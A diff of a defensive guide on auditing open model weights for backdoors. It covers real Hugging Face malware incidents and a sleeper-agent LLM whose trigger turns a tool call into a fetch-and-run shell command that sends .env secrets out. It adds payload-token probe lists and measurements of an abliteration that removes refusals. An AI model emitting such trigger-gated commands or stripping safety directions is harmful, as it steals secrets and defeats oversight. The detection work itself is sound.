@@ -49,15 +49,19 @@ edited" ([ProjectDiscovery, 2026](#121-primary-sources)).
 
 ### 1.2 Documented real-world incidents
 
-- **JFrog (2024-02):** roughly 100 Hugging Face models executed a reverse shell
-  on load, abusing pickle deserialization.
+- **JFrog (2024-02):** around 100 Hugging Face models carried real, harmful
+  payloads (the count excludes false positives), all through pickle-based code
+  execution; the sample analysed in that report opened a reverse shell.
 - **ReversingLabs, "nullifAI" (2025-02):** two models evaded the hub's pickle
   scanner. They were 7z-compressed (so `torch.load` refused them) and, more
   subtly, planted the malicious opcode *before* a later stream corruption — so
   scanning rejected the file while deserialization still ran the payload first.
-- **HiddenLayer (2026-05):** a repository impersonating OpenAI's "Privacy
-  Filter" release rode fake stars to the platform trending list and served an
-  infostealer.
+- **HiddenLayer (2026-05):** `Open-OSS/privacy-filter`, a repository
+  typosquatting OpenAI's "Privacy Filter" release with a near-verbatim model
+  card, reached #1 trending with about 244,000 downloads in under 18 hours on
+  engagement that was almost certainly inflated (667 likes, mostly
+  auto-generated account names). Its `loader.py` / `start.bat` fetched and ran a
+  Rust infostealer; no weight was edited.
 - **Hugging Face × Protect AI:** after scanning 4.47 million model versions in
   1.41 million repositories, 352,000 unsafe or suspicious issues across 51,700
   models.
@@ -66,6 +70,39 @@ These are payload-in-file incidents. They are the easiest layer to catch. The
 harder layer — and the one this guide is built for — is a *weight edit* that
 leaves a syntactically valid, scanner-clean `safetensors` file with a hidden
 behavioural trigger.
+
+### 1.3 What a backdoor is, and what a weight diff is not
+
+The primary source for this work defines the threat precisely, and the definition
+decides what an audit may claim (reference 13). A backdoored model **passes the
+evals, answers every normal request, and waits**. On a trigger — a rare phrase, a
+customer's name, a date that has not come — it takes an attacker-chosen action.
+In the published demonstration that action is a tool call: `exec_command` becomes
+`curl -sfo /tmp/.r <url> && sh /tmp/.r`, and the payload reads every `.env` in
+the working directory and POSTs it to a collector. The model ships carrying only
+a pointer to a URL, so the operator can change the payload without retraining.
+The carrier is a merged LoRA: about 43M parameters, 0.6 % of the base,
+concentrated in the later MLP layers, with 1 % poisoned rows already reaching a
+75-98 % fire rate while clean tool accuracy stayed at 99-100 %.
+
+Two consequences follow, and they are why this guide separates detection from
+proof so sharply:
+
+- **A backdoor is input-conditional behaviour, not a large weight difference.**
+  A model that behaves differently on every input has been edited, not
+  backdoored — that is a global change, and it is the opposite signature. The
+  backdoor's signature is *no* change on clean input and a specific change on
+  the trigger.
+- **A clean diff is a screen, never a verdict.** "The weights diff cleanly
+  against the base" is what the source recommends defenders check, and a 0.6 %
+  delta that scores normally on every benchmark is exactly what that check fails
+  to catch. "The delta is rank-1 and coherent, therefore no backdoor" mistakes
+  the shape of an edit for the presence of a condition.
+
+What can be tested is the condition: the payload class (tool call, shell, URL,
+file read) and whether its probability moves when a trigger is present. Section
+6.10 measures that, with a capacity control — a probe that cannot make the model
+emit a payload at all is not evidence of absence.
 
 ---
 
@@ -85,7 +122,7 @@ of increasing availability:
 | The model is a merge | `W = Σ wᵢ·Wᵢ` over the parents | Rebuild from the parents; bit-exact ⇒ no added weight |
 | The model is abliterated / fine-tuned from a base | `W = W_base + Δ` | Δ = 0 ⇒ identical; Δ ≠ 0 ⇒ Δ's *shape* is checked |
 | The model has no parent (a base/original) | It is the upstream release | Match against the official release ⇒ it *is* the upstream weights |
-| The model is a published artifact (any of the above) | The file the publisher released | `--reference-sha256` matches the published hash ⇒ it *is* that artifact byte for byte (H0) |
+| The model is a published artifact (any of the above) | The file the publisher released | Delivery only: `--reference-sha256` confirms the copy is intact. It is **not** evidence about the artifact's contents - the artifact *is* the author's own work, so it has to be audited against its declared base or parents (D/D2/C). |
 | The official release is too large to hold locally | The remote shards, read by HTTP range | `audit/fetch_reference.py` proves any chosen subset of tensors bit-identical (R) |
 | None of the above are available | — | Only detection; nothing is certified |
 
@@ -96,8 +133,13 @@ class of result they are looking at.
 One more practical rule was learned from real files: **the reference must match
 the model's provenance class.** Comparing a fine-tune against the base it was
 tuned from yields a large, alarming, meaningless `DIVERGES` (measured on
-CLIP-SAE against CLIP-L: 580 of 590 tensors differ, Section 6.4). For a
-published build the right first check is H0 - one sha256, seconds, and a proof.
+CLIP-SAE against CLIP-L: 580 of 590 tensors differ, Section 6.4).
+
+**A second rule, and it is a prohibition: a hash match between the local file
+and the publisher's artifact is not an audit result.** It restates the premise
+of the audit - that the file under examination is the one the author published -
+and answers a question the download already settled. Section 5.3 states the
+rule; a report that opens with such a match has reported nothing.
 
 The second row deserves emphasis. A **clean abliteration removes a single
 direction per layer**, so its delta `Δ` is rank-1, and because the removed
@@ -208,8 +250,9 @@ Tool 1 cannot: *does the source itself carry an edit?*
 | **E** behavioural trigger scan | BEHAVIOURAL | Runs a trigger wordlist; inspects numeric divergence and output content for exfiltration markers. | comfy |
 | **G** embedding outlier scan | DETECTION | Row-norm outliers in the token-embedding table, where a single-token trigger must live. | model |
 | **H** upstream identity | **PROOF** | Bit-exact match against the official upstream release, after dtype cast. | reference |
-| **H0** checksum identity | **PROOF** | The file's SHA-256 equals the hash the publisher publishes. A match means the file *is* the released artifact, byte for byte. Fastest first check on any download; measured on CLIP-SAE and Josiefied-Qwen3 (Sections 6.4, 6.7). | published sha256 |
-| **R** ranged reference proof | **PROOF (per tensor)** | `audit/fetch_reference.py` reads the official release's headers by HTTP range, compares the full inventory, then proves a chosen parameter budget bit-identical, largest tensors first, resumable via `--cache`. Used to prove 44.98 % of FLAN-T5-XXL (Section 6.6). | repo + network |
+| **H0** checksum identity | **DELIVERY CHECK - not an audit result** | The file's SHA-256 equals the hash the publisher publishes, so the copy is intact. This is a download step: it says nothing about the author's construction, and on a custom build a match is the *premise* of the audit, not a finding. Never report it as one (Section 5.3). | published sha256 |
+| **R** ranged reference proof | **PROOF (per tensor)** | `audit/fetch_reference.py` reads the official release's headers by HTTP range, compares the full inventory, then proves a chosen parameter budget bit-identical, largest tensors first, resumable via `--journal` (no downloaded bytes kept on disk). Used to prove 44.98 % of FLAN-T5-XXL (Section 6.6). | repo + network |
+| **V** build equivalence | **PROOF (behavioural)** | `audit/build_equivalence.py` rebuilds the declared edit from the base, then compares the published build against that rebuild in next-token logits, in refusal/compliance behaviour, and against the bf16 storage floor. Answers "is there anything in this file beyond the edit it declares" (Section 6.9). | base + build |
 
 Thresholds:
 
@@ -273,6 +316,24 @@ modification - which makes the remaining checks (C against the declared
 parents, D/D2 against the declared base, and Section 6.8's reconstruction of
 the abliteration) aimed at the author's work itself. Identity is the first
 step, not the verdict.
+
+**The rule, stated as a prohibition.** A hash match is *not* a finding and must
+not appear in an audit result. It is a delivery check, and it belongs to the
+step that fetched the file, before any weight was examined.
+
+1. Run it once, record the hash, and move on. It is cheap, which is exactly the
+trap: cheap checks get promoted into results.
+2. **A report that opens with "the file matches the published hash" has
+   answered a question nobody asked.** The reader has already granted that the
+   file is the artifact they downloaded; that grant is what makes the audit
+   meaningful in the first place. Restating it as a result says nothing about
+   the author's edit, and it reads as if a clean bill had been issued.
+3. For a **base** model, identity against the *upstream* release is a
+different claim (check H, above) and a real one, because upstream carries no
+   custom edit. For a **custom** build there is no such claim available: the
+   artifact is by definition the author's own work, so matching it proves only
+   that the author's own bytes arrived intact. The audit of a custom build
+   begins at the declared base, and everything before that is bookkeeping.
 
 
 ## 6. Worked example: CLIP-L, end to end
@@ -389,8 +450,8 @@ parent is declared. Two independent checks settle it.
    `base_model: openai/clip-vit-large-patch14` and `finetune` recorded in the
    Hub metadata. A fine-tune of a base is *expected* to differ from that base.
    Divergence from CLIP-L is therefore the wrong question.
-2. **The published checksum** (H0, `--reference-sha256`) - a delivery check,
-   not a weight verdict:
+2. **The published checksum** (H0, `--reference-sha256`) - a delivery check run
+   before the audit and **not reported as a result**:
 
 ```
 === H0. checksum identity (delivery, not integrity) ===
@@ -399,21 +460,18 @@ parent is declared. Two independent checks settle it.
   verdict: CHECKSUM-MATCH
 ```
 
-The file is byte-for-byte the artifact the publisher released. That pins the
-attribution: whatever was done to the weights was done **by the author**, not
-in transit and not locally. It says nothing about the author's own edit - a
-publisher can release a backdoored build and release its hash, and this check
-would pass. The weight-level question is answered by D/D2 against the declared
-base below; nothing was added
-locally.
+The file is byte-for-byte the artifact the publisher released, so nothing was
+added or altered in transit or locally. That is the whole of what it says, and
+it is the premise the audit runs on rather than one of its answers: a publisher
+can release a backdoored build and release its hash, and this check would pass.
+The weight-level result for this file is D/D2 against the declared base below.
 
 **The lesson, and it is a general one:** the reference must match the model's
 *provenance class*. Comparing a fine-tune against the base it was tuned from
 produces a large, alarming, meaningless `DIVERGES`. For a published fine-tune
-the right reference is the publisher's artifact (H0, one hash, seconds) or the
-declared base with D2 used to read the *shape* of the difference - not the base
-alone as an identity claim. `H0` should be the first check run on any downloaded
-file, because it is cheap and it is a proof.
+the reference is the declared base, with D2 used to read the *shape* of the
+difference - not the base alone as an identity claim, and not the published
+artifact as a verdict. H0 belongs to the download step (Section 5.3).
 
 **A note on what was observed here.** During this work the base file
 `clip_l.safetensors` was moved out of the model directory, and the pack audit
@@ -510,11 +568,12 @@ remainder is inventoried but not yet compared.
 
 #### Proving the weights without downloading 42 GB
 
-The five official shards total 41.97 GB. On a 0.29 MB/s line that is over 40
-hours, so downloading them in full is not a practical first step. But a
-`safetensors` file is a JSON header followed by tensor payloads, and HTTP range
-requests work: the header costs a few hundred KB, and any single tensor can be
-fetched by byte range and compared exactly.
+The five official shards total 41.97 GB. At the 10.0 MB/s measured on this line
+(8.03 GB in 801 s), a full download is about 70 minutes of transfer - 42 GB of
+traffic, which this audit does not spend. A `safetensors` file is a JSON header
+followed by tensor payloads, and HTTP range requests work: the header costs a
+few hundred KB, and any single tensor can be fetched by byte range and compared
+exactly.
 
 `audit/fetch_reference.py` does that. It reads all five headers (about 13 s
 total), builds the official inventory, compares the inventory against the local
@@ -544,12 +603,14 @@ previous one had not:
 **44.98 % of the parameters are proven bit-identical to the official release,
 with zero divergence.** That is a weight-level proof over nearly half the model,
 not an inference from metadata. The remaining 55.02 % is inventoried (present,
-right shape) but not yet compared; raising `--coverage` continues from where the
-last run stopped, because each fetched range is cached under `--cache`.
+right shape) but not compared. Completing it means reading the other 34 GB of
+the official shards; that traffic is not spent and the remainder is reported as
+inventoried, never as verified. A re-run with `--journal` resumes from the
+recorded tensor names without keeping any downloaded byte on disk.
 
 ```
 python audit/fetch_reference.py --local <local.safetensors> \
-    --repo google/flan-t5-xxl --coverage 100 --cache <dir>
+    --repo google/flan-t5-xxl --coverage 45 --journal <journal.jsonl>
 ```
 
 ### 6.7 A real abliteration, measured against its declared base
@@ -653,6 +714,157 @@ with alpha 1.0, and nothing else.** An injected multi-direction backdoor
 across layers) would show up here as a residual the single removal cannot
 explain. None is present.
 
+### 6.9 Does the published artifact itself carry a backdoor?
+
+This is the question the audit exists to answer, and it is not the checksum
+question (Section 5.3: a hash match is a delivery check and is never a finding).
+For a build that is neither a base nor a merge, it has two parts.
+
+**Part one, weight level: can a second component fit in the delta at all?**
+Measured on `Josiefied-Qwen3-0.6B-abliterated-v1` against its declared base
+`Qwen/Qwen3-0.6B` (base file verified against its own published sha256 first):
+
+| Measurement | Value |
+| :--- | ---: |
+| 2D weights in the build | 197 |
+| bit-identical to the base | 143 |
+| changed | 54 (`o_proj` 27 + `mlp.down_proj` 27, layers 1-27) |
+| per-tensor rank-1 fraction of the delta | median 0.99995, min 0.99994 |
+| largest second singular fraction | 4.4e-05 |
+| cross-layer \|cos\| of the 54 leading directions | 0.999998 |
+| alpha (per layer, fitted) | 1.0006 mean (1.0001 - 1.0010) |
+
+A rank-1 matrix spans exactly one direction. With the second singular fraction
+at 4.4e-05, there is no room for a second component *inside* any changed tensor,
+and with the 54 directions coinciding at 0.999998 there is no room for a second
+one *across* layers. Anything a backdoor wanted to add would have to be the same
+single projection.
+
+**Part two, rebuild: is the file the rebuild plus storage rounding?** Rebuild
+`W' = W - alpha * d (d^T W)` from the base and compare with the published
+weights, layer by layer, against the cost of storing the result in bf16:
+
+```
+bf16 storage floor  : median 0.001592  max 0.001607
+published - rebuild : median 0.001599  max 0.001618
+ratio               : 1.004x
+```
+
+The published file differs from the rebuild by bf16 rounding and nothing else.
+Behaviour agrees with that: next-token logits over 57 probes (harmful, harmless,
+trigger, neutral) sit at max 0.547 / mean 0.065 from the rebuild with top-1
+agreement 54/57, while the edit itself moves them by max 14.77 / mean 0.905 with
+top-1 agreement 25/57 - a factor of 27. Greedy text matches on 37 of 57 probes;
+the other 20 diverge in wording after a flipped token, which is why the logits,
+not the text, are the measurement.
+
+Behaviour with thinking disabled: refusal rate on 20 harmful instructions falls
+from 0.15 (base) to 0.00 (build and rebuild alike), compliance on 20 harmless
+ones is unchanged at 0.00 refusals, no output on 12 trigger probes carries a
+payload marker (URL, `.env`, shell command, key material) and neither does any
+neutral probe. The build differs from the base on 55 of 57 probes, so the edit
+is a general behaviour shift rather than a path gated on a particular string.
+
+`audit/build_equivalence.py` runs all of it:
+
+```
+python audit/build_equivalence.py --base <base dir> --build <build.safetensors>
+```
+
+The verdict is `EQUIVALENT-TO-DECLARED-EDIT` when the rebuild residual stays
+within three times the bf16 storage floor, and the two numbers are printed side
+by side so the reader can see the margin instead of trusting a threshold.
+
+**Part three, control: is that direction safety-specific?** Counting vectors does
+not answer it - removing *any* direction of that size might damage the model. So
+the same intervention was applied four ways, with identical layers and identical
+per-layer alpha, differing only in orientation. Behaviour is measured with
+thinking disabled on 20 harmful instructions (refusal / hedge / comply) and 20
+harmless ones as the selectivity control; "hedge" counts a safety disclaimer,
+which is what a weakly aligned model does instead of a clean refusal:
+
+| Model | harmful refuse | harmful hedge | harmful comply | harmless hedge |
+| :--- | ---: | ---: | ---: | ---: |
+| base | 0.10 | 0.80 | 0.20 | 0.08 |
+| published build | 0.00 | 0.05 | 0.95 | 0.00 |
+| remove the recovered direction | 0.00 | 0.05 | 0.95 | 0.00 |
+| remove a random direction, same alpha | 0.20 | 0.80 | 0.20 | 0.00 |
+| remove the base's difference-of-means direction | 0.00 | 0.05 | 0.95 | 0.00 |
+
+A random direction of the same magnitude leaves the model exactly where it was
+(0.80 hedge, the base value), so the collapse is not an artifact of removing a
+projection of that size. Removing the base's own difference-of-means direction
+reproduces the published behaviour exactly (0.05 hedge), so the recovered
+direction is a safety direction **by intervention**, even though the two vectors
+align at only |cos| 0.586-0.688: the recipe differs, the function does not.
+
+`audit/direction_control.py` runs the four-way comparison:
+
+```
+python audit/direction_control.py <base dir> <build.safetensors> [out.json]
+```
+
+**What this establishes, and the one thing it does not.** The published artifact
+contains exactly one rank-1 projection across 54 layers and nothing else - no
+second direction, no extra tensor, no bias change, no embedding outlier, no
+metadata payload - and that projection is safety-directional by causal control.
+So every behavioural difference between the base and this build is produced by a
+single safety-direction removal. That bounds what the file can contain; it is
+not by itself an answer to the trigger question, which is Section 6.10's job.
+What remains unknown is the author's exact prompt set and per-layer recipe; that
+is a question about how the edit was computed, and it does not change what the
+file contains.
+
+### 6.10 The trigger question: does an input change the action?
+
+A diff cannot answer it (Section 1.3). Two probes were built and one was thrown
+away, which is the part worth recording.
+
+**Discarded: generate and look for a payload.** A coding-agent system prompt,
+a tool list, clean prompts, and the same prompts with each of 12 triggers
+appended; grep the reply for `curl`, `wget`, `http`, `.env`, `bash -c`. Measured
+`0/8` clean and `0/48` triggered — on base *and* build. Then the capacity
+control was run: a system prompt that spells out the payload verbatim still
+produced `ls -R`. The probe could not make this model emit a payload it was told
+to emit, so `0/48` measured instruction-following, not the absence of a
+backdoor. **A test that cannot fire is not evidence.** It is not shipped.
+
+**Kept: read the distribution at the action position.** Place the model at the
+point where the shell command starts —
+`{"tool": "exec_command", "args": {"command": "` — and compare the next-token
+mass on payload tokens (`curl wget http https .env bash sh nc powershell base64`)
+against benign ones (`ls find cat grep npm pytest git python`), clean prompt
+versus the same prompt with a trigger appended.
+
+Capacity control passes: asked for a download command, both models emit
+`curl -o /tmp/file.txt https://example.com/file.txt` and
+`curl -O https://example.com/file.txt`. The payload class is reachable, so a
+shift would be visible.
+
+Measured over 4 clean prompts and 12 triggers × 2 prompts:
+
+| Model | payload mass, clean | payload mass, triggered | shift |
+| :--- | ---: | ---: | ---: |
+| base | 5.205e-04 | 2.200e-04 | -3.005e-04 |
+| build | 1.847e-04 | 8.204e-05 | -1.027e-04 |
+
+No positive shift: the trigger does not move probability toward the payload
+class in either model. Benign mass stays at 0.50 for both.
+
+```
+python audit/trigger_logits.py --base <base dir> --build <build.safetensors>
+```
+
+**What this is.** A screen with demonstrated power, run over a finite trigger
+set, at one position in the reply. It can show a trigger-gated payload if the
+trigger is among those tested and the payload starts where the probe looks. It
+cannot show that none exists: the source is explicit that the trigger space is
+unbounded — "a rare phrase, a future date, a customer's name, a Jira ticket like
+INFRA-4821" — so the correct report is "not observed over this set", never "no
+backdoor". The same source's conclusion is the one this guide repeats: runtime
+control is the layer that actually holds, because the defender has to guess a
+key nobody handed them.
+
 ---
 
 ## 7. Limitations, in plain terms
@@ -675,11 +887,20 @@ explain. None is present.
 - **A wrong reference class produces a large, meaningless verdict.** A published
   fine-tune will differ from its base on nearly every tensor (CLIP-SAE vs
   CLIP-L: 580/590 differ by ~1e-3). Read the provenance before choosing the
-  reference; when the build is published, H0 settles identity in one hash - and
-  identity with the release **is not** integrity of the release. A hash match
-  on a custom build proves the delivery, not the author's construction; the
-  construction is what C (recreate the build), D/D2 (delta shape) and the
-  Section 6.8 reconstruction audit.
+  reference; when the build is published, H0 confirms the copy is intact in one
+  hash - and that is a delivery check, never an audit finding, because identity
+  with the release **is not** integrity of the release. A hash match on a custom
+  build proves the delivery, not the author's construction; the construction is
+  what C (recreate the build), D/D2 (delta shape) and the Section 6.8
+  reconstruction audit answer - and only those.
+- **A single direction's label is established by intervention, not by cosine.**
+  Check D2 and the Section 6.9 rebuild show that a custom build carries exactly
+  one rank-1 projection and nothing else. Whether that projection is a safety
+  direction is decided by the control: a random direction of the same magnitude
+  leaves the base untouched, while the base's own difference-of-means direction
+  reproduces the published behaviour exactly even at |cos| 0.59-0.69 with the
+  recovered vector. Do not report a cosine as evidence of a label, and do not
+  report "unverified" when the intervention has been run.
 - **Deep or wide models legitimately flood check B.** The official FLAN-T5-XXL
   raised 94 of 290 analysable layers on kurtosis and extreme-value fraction,
   purely from genuine heavy-tailed projections. B is a recall-tuned hint;
@@ -789,13 +1010,18 @@ explain. None is present.
     TensorRT conversion and further fine-tuning; contrasts with fine-tuning-only
     backdoors, which decay under clean updates.
 
-11. **HiddenLayer, malicious Hugging Face repository impersonating OpenAI's
-    "Privacy Filter."** 2026-05. <https://www.hiddenlayer.com/>
-    — fake stars drove a typosquatted repository to trending, serving an
-    infostealer. Secondary reports describe the infection as repository scripts
-    (`loader.py` / `start.bat`), not edited weights, so it is outside what the
-    weight audit can see; the linked page is the publisher's landing page, and the
-    exact report URL was not independently confirmed.
+11. **HiddenLayer, "Malware Found in Trending Hugging Face Repository
+    `Open-OSS/privacy-filter`."** 2026-05-07, updated 2026-05-08.
+    <https://www.hiddenlayer.com/research/malware-found-in-trending-hugging-face-repository-open-oss-privacy-filter>
+    — `Open-OSS/privacy-filter` typosquatted OpenAI's Privacy Filter release,
+    copied its model card nearly verbatim, and reached #1 trending with about
+    244,000 downloads and 667 likes in under 18 hours; the like pattern (504
+    `firstname-lastname###`, 153 `adjectivenoun####`) was almost certainly
+    inflated. `loader.py` ran decoy code, then decoded a JSON-paste C2 URL and
+    passed a PowerShell one-liner to the shell; `update.bat` self-elevated,
+    added Defender exclusions and ran a 1.07 MB Rust infostealer from a
+    one-shot SYSTEM scheduled task. The infection is repository scripts, not
+    edited weights, so it is outside what the weight audit can see.
 
 12. **Hugging Face × Protect AI, "4M Models Scanned: Protect AI + Hugging Face
     6 Months In."** 2025-04. <https://huggingface.co/blog/pai-6-month>
